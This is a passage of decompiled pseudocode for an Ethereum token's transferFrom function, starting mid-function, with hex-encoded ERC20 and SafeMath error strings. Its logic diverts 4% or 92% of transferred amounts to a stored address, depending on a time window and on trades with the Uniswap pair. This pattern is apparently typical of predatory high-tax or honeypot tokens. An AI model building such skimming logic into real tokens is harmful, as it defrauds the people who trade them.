                emit Transfer(0, arg1, uniswapV2PairAddress);
            else:
                if 4 * arg3 / arg3 != 4:
                    revert with 0, 32, 33, 0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[517 len 31]
                if not arg1:
                    revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
                if not uniswapV2PairAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
                if 4 * arg3 / 100 > balanceOf[address(arg1)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[550 len 26],
                                mem[602 len 6]
                balanceOf[address(arg1)] -= 4 * arg3 / 100
                if (4 * arg3 / 100) + balanceOf[stor7] < balanceOf[stor7]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor7] += 4 * arg3 / 100
                emit Transfer((4 * arg3 / 100), arg1, uniswapV2PairAddress);
            if not arg3:
                if uniswapV2PairAddress != arg1:
                    if arg3 > allowance[address(arg1)][address(msg.sender)]:
                        revert with 0, 
                                    32,
                                    40,
                                    0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                    mem[712 len 24],
                                    mem[760 len 8]
                    if not arg1:
                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[840 len 28]
                    if not msg.sender:
                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[838 len 30]
                else:
                    if swapTime + _startTime < _startTime:
                        revert with 0, 'SafeMath: addition overflow'
                    if swapTime + _startTime < block.timestamp:
                        if arg3 > allowance[address(arg1)][address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        40,
                                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                        mem[712 len 24],
                                        mem[760 len 8]
                        if not arg1:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[840 len 28]
                        if not msg.sender:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[838 len 30]
                    else:
                        if not arg1:
                            revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[745 len 27]
                        if not uniswapV2PairAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[743 len 29]
                        if 0 > balanceOf[address(arg1)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[710 len 26],
                                        mem[762 len 6]
                        if balanceOf[stor7] < balanceOf[stor7]:
                            revert with 0, 'SafeMath: addition overflow'
                        balanceOf[stor7] = balanceOf[stor7]
                        emit Transfer(0, arg1, uniswapV2PairAddress);
                        if arg3 > allowance[address(arg1)][address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        40,
                                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                        mem[808 len 24],
                                        mem[856 len 8]
                        if not arg1:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[936 len 28]
                        if not msg.sender:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[934 len 30]
            else:
                if 92 * arg3 / arg3 != 92:
                    revert with 0, 32, 33, 0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[677 len 31]
                if uniswapV2PairAddress != arg1:
                    if not 92 * arg3 / 100:
                        if arg3 > allowance[address(arg1)][address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        40,
                                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                        mem[712 len 24],
                                        mem[760 len 8]
                        if not arg1:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[840 len 28]
                        if not msg.sender:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[838 len 30]
                    else:
                        if not arg1:
                            revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[745 len 27]
                        if not arg2:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[743 len 29]
                        if 92 * arg3 / 100 > balanceOf[address(arg1)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[710 len 26],
                                        mem[762 len 6]
                        balanceOf[address(arg1)] -= 92 * arg3 / 100
                        if (92 * arg3 / 100) + balanceOf[arg2] < balanceOf[arg2]:
                            revert with 0, 'SafeMath: addition overflow'
                        balanceOf[address(arg2)] = (92 * arg3 / 100) + balanceOf[arg2]
                        emit Transfer((92 * arg3 / 100), arg1, arg2);
                        if arg3 > allowance[address(arg1)][address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        40,
                                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                        mem[808 len 24],
                                        mem[856 len 8]
                        if not arg1:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[936 len 28]
                        if not msg.sender:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[934 len 30]
                else:
                    if swapTime + _startTime < _startTime:
                        revert with 0, 'SafeMath: addition overflow'
                    if swapTime + _startTime >= block.timestamp:
                        if not arg1:
                            revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[745 len 27]
                        if not uniswapV2PairAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[743 len 29]
                        if 92 * arg3 / 100 > balanceOf[address(arg1)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[710 len 26],
                                        mem[762 len 6]
                        balanceOf[address(arg1)] -= 92 * arg3 / 100
                        if (92 * arg3 / 100) + balanceOf[stor7] < balanceOf[stor7]:
                            revert with 0, 'SafeMath: addition overflow'
                        balanceOf[stor7] += 92 * arg3 / 100
                        emit Transfer((92 * arg3 / 100), arg1, uniswapV2PairAddress);
                        if arg3 > allowance[address(arg1)][address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        40,
                                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                        mem[808 len 24],
                                        mem[856 len 8]
                        if not arg1:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[936 len 28]
                        if not msg.sender:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[934 len 30]
                    else:
                        if not 92 * arg3 / 100:
                            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                                revert with 0, 
                                            32,
                                            40,
                                            0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                            mem[712 len 24],
                                            mem[760 len 8]
                            if not arg1:
                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[840 len 28]
                            if not msg.sender:
                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[838 len 30]
                        else:
                            if not arg1:
                                revert with 0, 32, 37, 0x7245524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[745 len 27]
                            if not arg2:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[743 len 29]
                            if 92 * arg3 / 100 > balanceOf[address(arg1)]:
                                revert with 0, 
                                            32,
                                            38,
                                            0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                            mem[710 len 26],
                                            mem[762 len 6]
                            balanceOf[address(arg1)] -= 92 * arg3 / 100
                            if (92 * arg3 / 100) + balanceOf[arg2] < balanceOf[arg2]:
                                revert with 0, 'SafeMath: addition overflow'
                            balanceOf[address(arg2)] = (92 * arg3 / 100) + balanceOf[arg2]
                            emit Transfer((92 * arg3 / 100), arg1, arg2);
                            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                                revert with 0, 
                                            32,
                                            40,
                                            0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                                            mem[808 len 24],
                                            mem[856 len 8]
                            if not arg1:
                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[936 len 28]
                            if not msg.sender:
                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[934 len 30]
    ('bool', 'msg.sender')
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
